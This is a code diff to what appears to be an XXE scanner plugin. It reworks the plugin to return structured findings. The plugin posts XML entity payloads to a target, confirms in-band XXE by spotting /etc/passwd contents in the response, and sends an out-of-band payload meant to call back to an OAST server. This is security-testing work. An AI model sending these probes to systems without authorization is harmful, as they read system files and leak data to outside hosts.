@@ -20,15 +20,22 @@ class Plugin(BasePlugin):
         """
         Run the XML External Entity (XXE) plugin
         """
-        # In-band detection
+        findings = []
         headers = {"Content-Type": "application/xml"}
+        
+        # In-band detection
         try:
             response = await requester.post(target, data=PAYLOAD, headers=headers)
-            if not response or not isinstance(response, dict):
-                return None
-            content = response.get("text") or ""
-            if "root:x:0:0:root" in content:
-                return f"XXE vulnerability found at {target}"
+            if response and isinstance(response, dict):
+                content = response.get("text") or ""
+                if "root:x:0:0:root" in content:
+                    findings.append({
+                        "type": "inband_xxe",
+                        "payload": PAYLOAD,
+                        "message": "In-band XXE confirmed by reading /etc/passwd.",
+                        "severity": "high",
+                        "confidence": "firm",
+                    })
         except Exception:
             pass
 
@@ -39,8 +46,14 @@ class Plugin(BasePlugin):
 <foo>&xxe;</foo>"""
             try:
                 await requester.post(target, data=oast_payload, headers=headers)
-                return f"OAST-based XXE payload sent. Check your OAST server for interactions."
+                findings.append({
+                    "type": "oast_based_xxe",
+                    "payload": oast_payload,
+                    "message": "OAST-based XXE payload sent. Check your OAST server for interactions.",
+                    "severity": "high",
+                    "confidence": "firm",
+                })
             except Exception:
                 pass
         
-        return None
+        return findings
